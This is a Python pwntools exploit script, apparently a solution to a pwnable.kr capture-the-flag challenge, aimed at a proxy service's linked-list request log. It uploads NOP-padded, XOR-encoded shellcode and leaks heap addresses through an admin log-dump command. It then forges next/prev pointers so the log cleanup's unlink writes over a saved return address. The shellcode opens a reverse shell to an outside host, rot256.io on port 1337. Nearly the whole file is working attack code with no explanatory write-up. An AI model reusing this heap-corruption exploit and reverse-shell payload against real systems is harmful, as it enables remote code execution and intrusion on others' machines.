import time
import socket
from pwn import *
from os import urandom

ip, port = ('pwnable.kr', 9903)

context.log_level = 'error'

wait = 0.1

shell_ip = socket.gethostbyname('rot256.io')
shell_port = 1337

"""
Log:
    IP   :   4 bytes (+ 0)
    Port :   4 bytes (+ 4)
    Host : 120 bytes (+ 8)
    Next :   4 bytes (+ 128)
    Prev :   4 bytes (+ 132)
"""

def send_entry(m):
    conn = remote(ip, port)
    conn.send('GET http://' + m + ' HTTP/1.1\r\n')
    conn.send('Host: ' + m + '\r\n')
    conn.send('\r\n')
    time.sleep(wait)
    conn.close()

def send(n):
    send_entry('padding%02d.org' % n)

def magic(n):
    return urandom(n / 2 + 1).encode('hex')[:n]

def getlog():
    conn = remote(ip, port)
    conn.send('admincmd_proxy_dump_log')
    conn.send('\r\n')
    out = ''
    while 1:
        try:
            out += conn.recv(1024)
        except EOFError:
            break
    return out

def leak():
    m = magic(120)
    send_entry(m)
    log = getlog()
    hew = log[log.find(m) + len(m):]
    assert hew.find(',') >= 4
    p_next = u32(hew[0:4])
    return p_next

# Load shellcod

with open('shell3.asm', 'rb') as f:
    code = f.read()
    code = code.format(
        ip = u32(socket.inet_aton(shell_ip)) ^ 0xBBBBBBBB,
        port = ((socket.htons(shell_port) << 16) + 0x02AA) ^ 0xBBBBBBBB)
shell = asm(code)
print 'Shellcode:\n' + shell.encode('hex')
assert '\x00' not in shell
assert '/' not in shell

# Fill log

print 'Filling log'
for n in range(32):
    print 'Sending: %2d' % n
    send(n)

# Send shellcode

print 'Uploading shellcode'
pad = 120 - len(shell)
entry = ''
entry += '\x90' * (pad / 2)
entry += shell
entry += '\x90' * (pad / 2)
assert len(entry) <= 120
send_entry(entry)

# Find shellcode address

print 'Finding shellcode address'
shell_addr = leak()
shell_addr += 8        # Skip IP and Port fields
print 'Shell at: 0x%x' % shell_addr

# Make fake tail

print 'Creating entry to be cleaned (fake tail)'
ebp = 0xbd8dcf48
ebp = 0xbd2d6f48
tar = (ebp + 4)
val = shell_addr

entry = ''
entry += cyclic(120 - 8)
entry += p32(tar - 0x84) # Fake next
entry += p32(val)        # Fake prev
assert len(entry) == 120
send_entry(entry)

# Find address of tail

print 'Finding tail address'
tail_addr = leak()
print 'Tail at: 0x%x' % tail_addr

# Make head, with overwritten prev

print 'Insert head, with borked prev'
entry = ''
entry += magic(120)
entry += p32(tail_addr - 8) # Next (whatever)
entry += p32(tail_addr - 8) # Prev
send_entry(entry)

# Trigger cleanup

print 'Trigger log cleanup'
send(1337)
print 'Done'
